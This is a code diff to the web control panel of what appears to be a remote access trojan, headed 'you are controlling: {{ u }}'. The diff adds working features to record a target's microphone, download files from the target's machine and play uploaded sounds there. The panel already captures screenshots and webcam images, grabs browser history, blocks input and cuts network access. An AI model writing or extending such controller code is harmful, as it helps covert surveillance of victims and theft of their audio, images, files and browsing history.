@@ -4,6 +4,20 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>control: {{ u }}</title>
+    <style>
+        .instruction_wrapper {
+          display: flex;
+          align-items: center;
+        }
+
+        .instruction_wrapper > *:not(:last-child) {
+          margin-right: 10px;
+        }
+
+        .instruction_type {
+            font-size: 20px;
+        }
+    </style>
 </head>
 <body>
     <h1>you are controlling: {{ u }}</h1>
@@ -44,7 +58,7 @@
         <button onclick="block_input()">block</button>
     </form>
     <br>
-    <b>psound (dangerous)</b>
+    <b>psound (dangerous) (only mp3)</b>
     <form>
         <input type="file" id="psound">
         <br>
@@ -132,11 +146,15 @@
             fetch("/clear_output/?u={{ u }}");
         }
         last_id = ""
+        seen_ids = new Set();
         function update_output() {
             fetch("/get_output/?u={{ u }}&last=" + last_id).then(response => response.json())
             .then(data => {
                 let output_list = document.querySelector("#output");
+                let add_newline = false;
                 for (let instruction_id in data) {
+                    if (seen_ids.has(instruction_id)) continue;
+                    seen_ids.add(instruction_id);
                     last_id = instruction_id;
                     let output_elem;
                     if (data[instruction_id][0] == "ss" || data[instruction_id][0] == "webcam") {
@@ -148,11 +166,32 @@
                             output_elem.setAttribute("src", output_elem.getAttribute("other_src"));
                             output_elem.setAttribute("other_src", temp);
                         })
+                        add_newline = true;
+                    } else if (data[instruction_id][0] == "raudio") {
+                        output_elem = document.createElement("audio");
+                        source_elem = document.createElement("source");
+                        source_elem.setAttribute("src", "/user_serve_temp/?f=" + data[instruction_id][1] + "&w=1");
+                        source_elem.setAttribute("type", "audio/wav");
+                        output_elem.setAttribute("controls", "");
+                        output_elem.appendChild(source_elem);
+                        add_newline = true;
+                    } else if (data[instruction_id][0] == "download") {
+                        output_elem = document.createElement("a");
+                        output_elem.textContent = "DOWNLOAD FILE";
+                        output_elem.setAttribute("href", "/user_serve_temp/?f=" + data[instruction_id][1]);
                     } else {
                         output_elem = document.createElement("p");
                         output_elem.textContent = data[instruction_id][1];
                     }
-                    output_list.appendChild(output_elem);
+                    wrapper_elem = document.createElement("div");
+                    wrapper_elem.setAttribute("class", "instruction_wrapper");
+                    type_elem = document.createElement("b");
+                    type_elem.setAttribute("class", "instruction_type");
+                    type_elem.textContent = `[${data[instruction_id][0]}]`;
+                    wrapper_elem.appendChild(type_elem);
+                    wrapper_elem.appendChild(output_elem);
+                    output_list.appendChild(wrapper_elem);
+                    if (add_newline) output_list.appendChild(document.createElement("br"));
                 }
             });
         }
@@ -201,8 +240,16 @@
             add_instruction(["binput", document.querySelector("#binput").value]);
         }
         function play_sound() {
-            // post
-            // add
+            let form_data = new FormData();
+            form_data.append("file", document.querySelector("#psound").files[0]);
+            fetch("/upload_temp/", {
+                method: "POST",
+                body: form_data
+            }).then(response => {
+                return response.text();
+            }).then(file_id => {
+                add_instruction(["psound", file_id]);
+            });
         }
         function kill_internet() {
             add_instruction(["offnet", document.querySelector("#offnet").value]);
@@ -230,7 +277,7 @@
             add_instruction(["ghistory"]);
         }
         function record_audio() {
-            // to be done
+            add_instruction(["raudio", document.querySelector("#raudio").value]);
         }
         function screenshot() {
             add_instruction(["ss"]);
